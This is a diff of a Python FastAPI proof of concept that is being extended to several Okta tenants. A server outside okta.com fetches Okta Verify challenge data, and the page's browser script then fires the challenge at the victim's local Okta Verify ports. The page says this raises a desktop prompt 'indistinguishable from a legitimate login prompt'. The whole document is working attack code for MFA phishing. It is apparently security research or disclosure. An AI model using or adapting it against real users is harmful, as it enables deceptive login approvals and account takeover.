@@ -1,17 +1,14 @@
 """
-POC – Okta Verify Challenge Trigger (split flow)
+POC – Okta Verify Challenge Trigger (split flow, multi-tenant)
 
 Backend:
   1. GET  /oauth2/v1/authorize               → extract stateToken from HTML
   2. POST /idp/idx/introspect                → exchange stateToken for stateHandle
   3. POST /idp/idx/authenticators/okta-verify/launch → get challengeRequest + httpsDomain + ports
-  4. Return challengeRequest + httpsDomain + ports to browser
+  4. Return to browser
 
 Frontend (browser):
   5. POST https://{httpsDomain}:{port}/challenge → fires directly to victim's localhost
-
-This mirrors exactly how the real Okta widget works, and means the server
-never needs to reach localhost — the browser does it.
 
 Run:
   pip install fastapi uvicorn httpx
@@ -26,52 +23,55 @@ from typing import Optional
 from fastapi import FastAPI, HTTPException
 from fastapi.responses import HTMLResponse
 
-# ── Config ────────────────────────────────────────────────────────────────────
+# ── Tenant config ─────────────────────────────────────────────────────────────
 
-OKTA_HOST = "katphish.okta.com"
-
-AUTHORIZE_URL = (
-    f"https://{OKTA_HOST}/oauth2/v1/authorize"
-    "?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26"
-    "&code_challenge=u0Ro65lsejHZCTu2XXXwVKzkOEr69_xuG8pb3rKclKc"
-    "&code_challenge_method=S256"
-    "&nonce=0h9qE4oJRz3htVkyZ6xTbdNOpV2O03gpoT7sGQOyqBd5bQiDgIqEMWVrXMaVbraG"
-    "&redirect_uri=https%3A%2F%2Fkatphish.okta.com%2Fenduser%2Fcallback"
-    "&response_type=code"
-    "&state=vfvJnxUHj3JNWMHFrYWXwN0pvFSsk9GHkIe4h8nM8ahePaHx7cIVxXTrA1DXfVKi"
-    "&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self"
-    "%20okta.internal.enduser.read%20okta.internal.enduser.manage"
-    "%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
-    "%20okta.myAccount.sessions.manage%20okta.internal.navigation.enduser.read"
-)
-
-BASE_HEADERS = {
-    "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Origin":     f"https://{OKTA_HOST}",
-    "User-Agent": (
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
-        "AppleWebKit/537.36 (KHTML, like Gecko) "
-        "Chrome/145.0.0.0 Safari/537.36"
-    ),
+TENANTS = {
+    "katphish": {
+        "host":          "katphish.okta.com",
+        "authorize_url": (
+            "https://katphish.okta.com/oauth2/v1/authorize"
+            "?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26"
+            "&code_challenge=u0Ro65lsejHZCTu2XXXwVKzkOEr69_xuG8pb3rKclKc"
+            "&code_challenge_method=S256"
+            "&nonce=0h9qE4oJRz3htVkyZ6xTbdNOpV2O03gpoT7sGQOyqBd5bQiDgIqEMWVrXMaVbraG"
+            "&redirect_uri=https%3A%2F%2Fkatphish.okta.com%2Fenduser%2Fcallback"
+            "&response_type=code"
+            "&state=vfvJnxUHj3JNWMHFrYWXwN0pvFSsk9GHkIe4h8nM8ahePaHx7cIVxXTrA1DXfVKi"
+            "&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self"
+            "%20okta.internal.enduser.read%20okta.internal.enduser.manage"
+            "%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
+            "%20okta.myAccount.sessions.manage%20okta.internal.navigation.enduser.read"
+        ),
+    },
+    "spark-sec": {
+        "host":          "spark-sec.okta.com",
+        "authorize_url": (
+            "https://spark-sec.okta.com/oauth2/v1/authorize"
+            "?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26"
+            "&code_challenge=3hWM6Vs0RMud589BSRxGRz1M8cJ4qjrLbfLXgruzFCY"
+            "&code_challenge_method=S256"
+            "&nonce=LrAFkOR1KGVGax2ziFxsaRTSnKtoyvsWX2ezppVvtTgVhwiO100axWndAnawHs2I"
+            "&redirect_uri=https%3A%2F%2Fspark-sec.okta.com%2Fenduser%2Fcallback"
+            "&response_type=code"
+            "&state=9ztnjubJgj8cWKvQfMaMp4l3cPMAnN4yQnMMK3no2h4DXSddpeT0FywiEpCqyJbM"
+            "&scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self"
+            "%20okta.internal.enduser.read%20okta.internal.enduser.manage"
+            "%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage"
+            "%20okta.myAccount.sessions.manage%20okta.internal.navigation.enduser.read"
+        ),
+    },
 }
 
-IDX_HEADERS = {
-    **BASE_HEADERS,
-    "Accept":       "application/json; okta-version=1.0.0",
-    "Content-Type": "application/json",
-}
-
-# ── Extraction helpers ────────────────────────────────────────────────────────
+# ── Helpers ───────────────────────────────────────────────────────────────────
 
 def _extract_state_token(html: str) -> Optional[str]:
-    """Extract stateToken from the /authorize HTML response (embedded JS variable)."""
+    """Extract stateToken from the /authorize HTML response."""
     m = re.search(r"var\s+stateToken\s*=\s*'([\s\S]+?)'\s*;", html)
     if m:
         token = m.group(1)
         token = re.sub(r'\\\n', '', token)
         token = token.replace('\\x2D', '-')
         return token.strip()
-    # Fallback: inside modelDataBag
     m = re.search(r'\\x22stateToken\\x22:\\x22([^\\]+)', html)
     if m:
         return m.group(1).replace('\\x2D', '-')
@@ -84,7 +84,6 @@ def _extract_state_handle(body: dict) -> Optional[str]:
 
 
 def _find_in_values(obj, key):
-    """Recursively find a key anywhere in a nested dict/list."""
     if isinstance(obj, dict):
         if key in obj:
             return obj[key]
@@ -121,17 +120,35 @@ def _status_text(code: int) -> str:
 app = FastAPI()
 
 
-@app.get("/api/challenge")
-async def get_challenge():
-    """
-    Server fetches challengeRequest + httpsDomain + ports from Okta.
-    Returns them to the browser, which fires the local /challenge call itself.
-    """
+@app.get("/api/challenge/{tenant}")
+async def get_challenge(tenant: str):
+    if tenant not in TENANTS:
+        raise HTTPException(404, f"Unknown tenant: {tenant}")
+
+    cfg        = TENANTS[tenant]
+    okta_host  = cfg["host"]
+    auth_url   = cfg["authorize_url"]
+
+    base_headers = {
+        "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Origin":     f"https://{okta_host}",
+        "User-Agent": (
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/145.0.0.0 Safari/537.36"
+        ),
+    }
+    idx_headers = {
+        **base_headers,
+        "Accept":       "application/json; okta-version=1.0.0",
+        "Content-Type": "application/json",
+    }
+
     async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:
 
         # Step 1: GET /authorize → extract stateToken
         try:
-            r1 = await client.get(AUTHORIZE_URL, headers=BASE_HEADERS)
+            r1 = await client.get(auth_url, headers=base_headers)
         except httpx.RequestError as e:
             raise HTTPException(502, f"/authorize unreachable: {e}")
 
@@ -147,9 +164,9 @@ async def get_challenge():
         # Step 2: POST /introspect → get stateHandle
         try:
             r2 = await client.post(
-                f"https://{OKTA_HOST}/idp/idx/introspect",
+                f"https://{okta_host}/idp/idx/introspect",
                 json={"stateToken": state_token},
-                headers=IDX_HEADERS,
+                headers=idx_headers,
             )
         except httpx.RequestError as e:
             raise HTTPException(502, f"/introspect unreachable: {e}")
@@ -166,9 +183,9 @@ async def get_challenge():
         # Step 3: POST /launch → get challengeRequest + httpsDomain + ports
         try:
             r3 = await client.post(
-                f"https://{OKTA_HOST}/idp/idx/authenticators/okta-verify/launch",
+                f"https://{okta_host}/idp/idx/authenticators/okta-verify/launch",
                 json={"stateHandle": state_handle},
-                headers=IDX_HEADERS,
+                headers=idx_headers,
             )
         except httpx.RequestError as e:
             raise HTTPException(502, f"/launch unreachable: {e}")
@@ -190,7 +207,6 @@ async def get_challenge():
         if not ports:
             raise HTTPException(422, "ports not found in /launch response")
 
-        # Return to browser — browser will fire the local /challenge call
         return {
             "challengeRequest": challenge_request,
             "httpsDomain":      https_domain.rstrip("/"),
@@ -212,6 +228,7 @@ HTML = """<!DOCTYPE html>
   .warning{background:#1e1e2e;border-left:4px solid #f87171;padding:1rem 1.25rem;
            border-radius:4px;margin-bottom:2rem;font-size:.9rem;line-height:1.6;color:#cbd5e1}
   .warning strong{color:#f87171}
+  .buttons{display:flex;gap:1rem;margin-top:1.5rem}
   button{padding:.75rem 2rem;background:#f87171;color:#0f0f0f;font-weight:bold;
          border:none;border-radius:4px;cursor:pointer;font-size:1rem;letter-spacing:.03em}
   button:hover{background:#ef4444}
@@ -230,23 +247,26 @@ HTML = """<!DOCTYPE html>
 <div class="warning">
   <strong>What this demonstrates:</strong><br><br>
   This page is hosted on <span class="domain">a domain completely outside okta.com</span> — unrelated to any Okta tenant.<br><br>
-  Clicking the button below will trigger a real <strong>Okta Verify challenge on your desktop</strong>,
+  Clicking either button below will trigger a real <strong>Okta Verify challenge on your desktop</strong>,
   indistinguishable from a legitimate login prompt.
 </div>
 
-<button id="btn" onclick="run()">▶ Trigger Okta Verify</button>
+<div class="buttons">
+  <button id="btn-katphish" onclick="run('katphish')">▶ Trigger katphish</button>
+  <button id="btn-spark-sec" onclick="run('spark-sec')">▶ Trigger spark-sec</button>
+</div>
 
 <div id="status"></div>
 
 <script>
-async function run() {
-  const btn = document.getElementById('btn');
+async function run(tenant) {
+  const btn = document.getElementById('btn-' + tenant);
   btn.disabled = true;
-  setStatus('info', '⏳ Fetching challenge from Okta…');
+  setStatus('info', '⏳ Fetching challenge for ' + tenant + '…');
 
   try {
     // Step 1: backend fetches challengeRequest from Okta server-side
-    const res = await fetch('/api/challenge');
+    const res = await fetch('/api/challenge/' + tenant);
     if (!res.ok) {
       const data = await res.json().catch(() => ({}));
       setStatus('err', '❌ ' + (data.detail ?? `HTTP ${res.status}`));
@@ -258,7 +278,6 @@ async function run() {
     setStatus('info', '⏳ Firing challenge to local Okta Verify…');
 
     // Step 2: browser fires directly to victim's localhost
-    // Try httpsDomain first (Mac), then http://localhost and http://127.0.0.1 (Windows)
     const targets = [
       ...ports.map(p => `${httpsDomain}:${p}`),
       ...ports.map(p => `http://localhost:${p}`),
